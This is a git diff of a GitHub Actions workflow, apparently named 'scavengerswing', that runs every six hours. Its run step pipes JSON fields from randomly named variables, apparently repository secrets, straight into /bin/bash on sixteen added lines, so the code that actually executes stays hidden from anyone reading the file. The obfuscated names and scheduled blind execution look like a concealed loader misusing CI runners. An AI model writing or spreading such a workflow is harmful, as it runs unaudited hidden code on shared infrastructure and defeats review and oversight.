@@ -1,9 +1,11 @@
 name: scavengerswing
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 3/6 * * *'
-jobs:  # 15030
+    - cron: '40 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,14 +13,22 @@ jobs:  # 15030
       - uses: actions/checkout@v4
       - name: scavengerswing
         env:
-          pgrau97853: ${{ secrets.pgrau97853 }}
+          dxwmt263: ${{ secrets.dxwmt263 }}
         run: |
-          echo $pgrau97853 | jq -r .kmzwh573 | /bin/bash
-          echo $jlkpb09 | jq -r .f00002 | /bin/bash
-          echo $n449 | jq -r .s7 | /bin/bash
-          echo $i53 | jq -r .zzg48 | /bin/bash
-          echo $zqzle9051 | jq -r .cm48531 | /bin/bash
-          echo $q71681 | jq -r .v067 | /bin/bash
-          echo $ymiry74416 | jq -r .uoh830 | /bin/bash
-          echo $o935 | jq -r .imuof8 | /bin/bash
+          echo $dxwmt263 | jq -r .sn13 | /bin/bash
+          echo $mfc0 | jq -r .dy6793 | /bin/bash
+          echo $d2 | jq -r .pyiei86129 | /bin/bash
+          echo $ghuy9 | jq -r .de465 | /bin/bash
+          echo $msc56721 | jq -r .dyh8578 | /bin/bash
+          echo $kjt883 | jq -r .dwk6558 | /bin/bash
+          echo $c4 | jq -r .awgre6274 | /bin/bash
+          echo $nuxak79 | jq -r .rowad25 | /bin/bash
+          echo $jh3720 | jq -r .ek57069 | /bin/bash
+          echo $u01 | jq -r .jw465 | /bin/bash
+          echo $wydz17 | jq -r .c82 | /bin/bash
+          echo $ou9 | jq -r .n17 | /bin/bash
+          echo $vxf69806 | jq -r .g0 | /bin/bash
+          echo $iv16832 | jq -r .jcvwg155 | /bin/bash
+          echo $q25 | jq -r .supn746 | /bin/bash
+          echo $inltf98 | jq -r .ydj961 | /bin/bash
 
